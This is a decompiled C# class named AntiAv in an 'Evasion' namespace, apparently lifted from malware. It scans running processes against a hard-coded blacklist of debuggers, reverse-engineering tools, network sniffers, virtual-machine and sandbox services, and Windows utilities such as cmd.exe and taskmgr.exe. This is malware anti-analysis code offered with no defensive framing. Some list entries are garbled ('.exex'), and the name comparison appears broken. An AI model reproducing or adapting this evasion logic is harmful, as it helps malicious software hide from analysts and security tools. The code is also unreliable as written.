using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;

namespace Evasion
{
	// Token: 0x0200001B RID: 27
	public static class AntiAv
	{
		// Token: 0x06000038 RID: 56 RVA: 0x00004460 File Offset: 0x00002660
		public static bool IsAvPresent()
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				string processName = processes[i].ProcessName;
				if (AntiAv.blackListedProcesses.Contains(processName))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0400003C RID: 60
		[global::System.Runtime.CompilerServices.Nullable(1)]
		public static readonly string[] blackListedProcesses = new string[]
		{
			"ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "regedit.exe", "cmd.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe",
			"vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe",
			"x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe",
			"joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe", "32dbg.exe", "64dbg.exex", "protection_id.exex", "scylla_x86.exe",
			"scylla_x64.exe", "scylla.exe", "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe",
			"ida64.exe", "ida.exe", "ollydbg.exe"
		};
	}
}
